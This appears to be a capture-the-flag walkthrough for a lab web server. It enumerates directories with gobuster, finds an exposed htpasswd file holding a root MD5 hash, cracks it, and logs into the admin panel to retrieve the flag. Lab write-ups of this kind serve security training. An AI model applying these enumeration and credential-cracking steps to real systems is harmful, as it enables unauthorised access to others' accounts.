## Step 1: Initial Access

Open the target website in your browser:

```
http://<target-ip>
```

---

## Step 2: Directory Enumeration

Use `gobuster` to brute-force directories and files:

```bash
gobuster dir -u http://192.168.11.54/ \
-w /usr/share/wordlists/dirb/common.txt \
--exclude-length 975
```

**Relevant Results:**

```
admin        (301)  --> /admin/
whatever     (301)  --> /whatever/
robots.txt   (200)
index.php    (200)
```

---

## Step 3: Discover Hidden File

Navigate to the suspicious directory:

```
http://<target-ip>/whatever/
```

Inside this directory, a file named **`htpasswd`** is exposed.

---

## Step 4: Extract Credentials

Open the `htpasswd` file:

```
root:437394baff5aa33daa618be47b75cb49
```

This reveals:

* **Username:** `root`
* **Password Hash:** `437394baff5aa33daa618be47b75cb49`

---

## Step 5: Identify & Crack the Hash

Use `hash-identifier` to determine the hash type:

```
hash-identifier 437394baff5aa33daa618be47b75cb49
```

**Result:**
-> MD5

Crack the MD5 hash:

```
437394baff5aa33daa618be47b75cb49 → qwerty123@
```

---

## Step 6: Admin Login

Go to the admin panel:

```
http://<target-ip>/admin
```

Use the cracked credentials:

```
Username: root
Password: qwerty123@
```

---

## Step 7: Get the Flag

After successful login, the flag is displayed on the admin page.
